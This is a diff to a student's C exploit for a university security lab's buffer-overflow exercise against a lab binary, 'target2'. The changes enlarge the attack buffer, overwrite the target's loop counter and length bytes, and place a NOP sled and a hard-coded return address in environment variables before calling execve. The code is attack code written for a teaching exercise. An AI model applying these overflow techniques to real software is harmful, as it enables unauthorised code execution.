@@ -6,7 +6,7 @@
 
 #define TARGET "../targets/target2"
 
-#define DEFAULT_BUFFER_SIZE  140
+#define DEFAULT_BUFFER_SIZE  270
 #define NOP 0x90
 #define ZERO 0x00
 int
@@ -36,30 +36,26 @@ main ( int argc, char * argv[] )
 	}
 
 
-	ptr = buff + bsize  - 20;
-	// overwriting j and len to -20 and -1
-	for (i=0; i<4; i++){	
-		if (i<=2){
-			*(ptr++) = 0x00;
-		}
-		else{
-			*(ptr++) = 0x00;	
-		}
-	}
-	ptr = buff + bsize  - 16;
-	for (i=0; i<4; i++){	
-		if (i == 0){
-			*(ptr++) = 0x13;
-		}		
-		else if (i>0 && i<=2){
-			*(ptr++) = 0x01;
-		}
-		else{
-			*(ptr++) = 0xFF;	
-		}
+	ptr = buff + bsize  - 6;
+	// overwriting least byte of j to  
+	*(ptr++) = 0x0B;
+
+	// overwriting len to 
+	ptr = buff + bsize  - 2;
+	*(ptr++) = 0x1C;
+	*(ptr++) = 0x01;
+
+
+
+	char* add;
+	char* nop;
+	add = (char*)malloc(4 * sizeof(char));
+	nop = (char*)malloc(7 * sizeof(char));
+	for (i = 0; i < 7; i++){
+		nop[i] = NOP;
 	}
 
-	ptr = buff + bsize  - 4;
+	ptr = add;
 	*ptr = 0x40;
 	ptr++;
 	*ptr = 0xfd;
@@ -67,15 +63,29 @@ main ( int argc, char * argv[] )
 	*ptr = 0xa4;
 	ptr++;
 	*ptr = 0x40;
+	//ptr++;
+	//*ptr = 0x00;
 
-
+/*
+	FILE *fp;
+	fp = fopen("/u/a/wang2213/Desktop/Workspace/ECE568-Computer-Security-Lab/ece568-lab1-2020f/sploits/1.txt","w");
+	for (i=0; i<bsize; i++){
+		fprintf(fp,"%c",buff[i]);
+	}
+	fclose(fp);
+*/
 	//char * s = "\x40\xfd\xa4\x40\x00";
 	args[0] = TARGET;
 	args[1] = buff;
 	args[2] = NULL;
 
-	env[0] = NULL;
-	//printf("the size of input is %d\n",strlen(args[1]));
+	env[0] = "\x00";
+	env[1] = nop;
+	env[2] = add;
+	printf("the content of buff is %c\n",buff[280]);
+	printf("the size of input is %d\n",strlen(buff));
+	
+	
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
 
